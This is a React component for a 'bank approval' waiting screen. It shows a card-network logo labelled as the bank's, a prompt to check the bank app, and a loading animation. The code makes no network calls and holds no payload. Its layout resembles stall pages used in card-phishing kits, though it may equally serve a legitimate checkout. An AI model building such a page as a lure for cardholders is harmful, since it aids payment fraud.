
import React from 'react';
import { ShieldCheck } from 'lucide-react';
import { useTranslation } from '../TranslationContext';

interface BankApprovalPageProps {
  cardType?: 'visa' | 'mastercard' | 'amex';
}

export const BankApprovalPage: React.FC<BankApprovalPageProps> = ({ cardType = 'visa' }) => {
  const { t } = useTranslation();
  const logos = {
    visa: 'https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg',
    mastercard: 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg',
    amex: 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg'
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col items-center justify-center max-w-md mx-auto shadow-xl p-8 animate-in fade-in duration-700">
      <div className="w-full bg-white rounded-3xl p-8 shadow-sm border border-slate-200 text-center space-y-8">
        <div className="flex justify-center mb-4">
          <img src={logos[cardType]} alt="Bank Logo" className="h-8 object-contain" />
        </div>

        <div className="space-y-2">
          <h2 className="text-xl font-black text-slate-900 tracking-tight uppercase italic">{t('bankApproval')}</h2>
          <div className="h-1 w-12 bg-blue-600 mx-auto rounded-full" />
        </div>

        <div className="p-6 bg-slate-50 rounded-2xl space-y-4">
          <ShieldCheck className="w-12 h-12 text-blue-500 mx-auto" />
          <p className="text-slate-600 text-sm font-medium leading-relaxed">
            {t('checkBankApp')}
          </p>
        </div>

        <div className="flex flex-col items-center gap-3">
          <div className="flex gap-2">
            <div className="w-2.5 h-2.5 bg-blue-600 rounded-full animate-bounce [animation-delay:-0.3s]" />
            <div className="w-2.5 h-2.5 bg-blue-600 rounded-full animate-bounce [animation-delay:-0.15s]" />
            <div className="w-2.5 h-2.5 bg-blue-600 rounded-full animate-bounce" />
          </div>
          <span className="text-[10px] text-slate-400 font-bold uppercase tracking-widest">{t('waitingApproval')}</span>
        </div>
      </div>

      <footer className="mt-12 text-center space-y-4">
        <p className="text-[10px] text-slate-400 font-medium px-4">
          {t('thisWillTake')}
        </p>
        <div className="flex justify-center items-center gap-6 opacity-40 grayscale">
          <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg" className="h-3" alt="" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-3" alt="" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" className="h-3" alt="" />
        </div>
      </footer>
    </div>
  );
};
